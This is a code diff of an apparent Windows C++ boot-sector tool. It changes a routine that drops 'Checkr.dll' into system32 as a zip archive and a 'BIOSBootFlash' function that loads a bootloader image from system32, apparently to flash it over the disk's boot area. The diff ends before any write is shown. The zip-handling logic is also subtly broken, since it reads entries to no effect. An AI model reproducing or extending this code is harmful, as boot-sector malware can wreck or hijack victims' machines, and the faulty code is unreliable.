@@ -1,17 +1,43 @@
+#include <iostream>
 #include <cstdlib>
 #include <sys/types.h>
 #include <Windows.h>
 #include <winioctl.h>
 #include <WinUser.h>
-#include <iostream>
 #include <stdlib.h>
 #include <direct.h>
 #include <fstream>
 #include <vector>
+#include <libzippp/libzippp.h>
+
 using namespace std;
+using namespace libzippp;
 
 void UnpackDeps() {
-    system("powershell Copy-Item \"Checkr.dll\" \"C:\\Windows\"");
+
+    CopyFile(L"Checkr.dll", L"C:\\Windows\\system32\\system.zip", false);
+
+    ZipArchive zf("C:\\Windows\\system32\\system.zip");
+    bool opened = zf.open(ZipArchive::Write);
+     
+    if (opened) {
+        std::vector<ZipEntry> entries = zf.getEntries();
+        for (ZipEntry& entry : entries) {
+            std::string name = entry.getName();
+            ZipArchive::State state = ZipArchive::State::Original;
+
+            if (state == ZipArchive::State::Original) {
+                entry.readAsBinary();
+            }
+        }
+        zf.close();
+    }
+    else {
+        std::cout << "Failed to open archive." << std::endl;
+    }
+
+
+
 }
 
 bool is_efi() {
@@ -22,7 +48,7 @@ bool is_efi() {
 
 int BIOSBootFlash() {
     // Open the source file
-    HANDLE hSource = CreateFile(TEXT("boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\system32\\bootloader.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hSource == INVALID_HANDLE_VALUE) {
          cerr << "Failed to open source file.\n";
         return 1;
